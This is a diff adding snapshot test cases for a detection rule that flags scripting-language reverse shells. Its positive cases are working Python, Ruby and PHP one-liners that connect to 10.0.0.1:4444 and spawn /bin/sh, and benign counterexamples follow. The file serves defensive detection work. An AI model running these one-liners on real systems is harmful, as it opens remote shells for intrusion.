@@ -1,0 +1,18 @@
+# EX-019: Scripting-language reverse shell
+# Test cases for snapshot testing
+# Detects reverse shells built with a scripting language's socket + exec
+# primitives (Python/Perl/Ruby/PHP), not covered by EX-005/EX-006/EX-015
+# (MITRE T1059, T1071).
+
+# === Cases that SHOULD be detected ===
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+perl -e 'use Socket;connect(S,...);exec("/bin/sh -i");'
+ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4444");exec"/bin/sh -i"'
+php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# === Cases that should NOT be detected (benign) ===
+import socket
+subprocess.run(["ls", "-l"])
+perl -e 'print "hello\n"'
+php -r 'echo phpversion();'
